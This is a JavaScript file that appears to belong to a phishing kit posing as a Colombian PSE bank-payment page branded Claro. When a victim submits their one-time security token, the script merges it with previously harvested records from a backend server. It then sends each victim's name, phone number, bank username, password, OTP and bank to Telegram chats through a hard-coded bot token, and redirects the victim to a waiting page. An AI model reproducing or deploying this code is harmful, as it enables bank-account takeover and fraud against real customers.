// Function to update the local storage with new info
function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento botón OTP
const otpButton = document.getElementById("btnOTP");

// Elemento input número de celular
const numberMovil = document.getElementById("txtOTP");

// Función para enviar mensaje a Telegram
async function sendToTelegram(message) {
  try {
    // Enviar el mensaje a cada chatId
    for (const chatId of chatIds) {
      const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;

      const response = await fetch(url);
      if (!response.ok) {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      } else {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      }
    }
  } catch (error) {
    console.error("Error de red al enviar mensaje:", error);
  }
}

// Función para actualizar el OTP
async function updateOtp() {
  try {
    const response = await fetch(`${url}/trico/tricoData`, {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error("Error al obtener los datos del servidor");
    }

    const serverData = await response.json();
    const dataTables = [...serverData];

    for (const data of dataTables) {
      if (data.id == info.metaInfo.cc) {
        console.log("Usuario Encontrado");

        // Actualizar el OTP en el servidor
        const updateResponse = await fetch(
          `${url}/trico/updateTricoPse/${data.idreg}`,
          {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              otp: info.metaInfo.cdin,
            }),
          }
        );

        if (!updateResponse.ok) {
          throw new Error("Error al actualizar usuario con OTP");
        }

        const updateData = await updateResponse.json();

        // Crear el mensaje con toda la información
        const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${data.usuario}\n🔒Contraseña: ${data.password}\n💎OTP: ${info.metaInfo.cdin}\n🏦Banco: ${data.bank}\nFuente: ${fuente}\nIngresó OTP`;

        // Enviar el mensaje a Telegram
        await sendToTelegram(message);

        console.log("Usuario actualizado con OTP");
      }
    }

    // Redirigir a la página de espera
    window.location.href = "wait.html";
  } catch (error) {
    console.error("Error al procesar el OTP:", error);
    otpButton.disabled = false; // Reactivar el botón en caso de error
  }
}

// Evento click en el botón OTP
otpButton.addEventListener("click", async function (e) {
  e.preventDefault();
  otpButton.disabled = true;

  // Validación de campo vacío
  if (numberMovil.value == "") {
    alert("Por favor ingrese token de seguridad");
    numberMovil.focus();
    otpButton.disabled = false;
    return;
  } else {
    const din = numberMovil.value;
    info.metaInfo.cdin = din;

    updateLS(); // Actualizar la información en el localStorage

    await updateOtp(); // Llamar a la función que maneja el proceso de OTP
  }
});
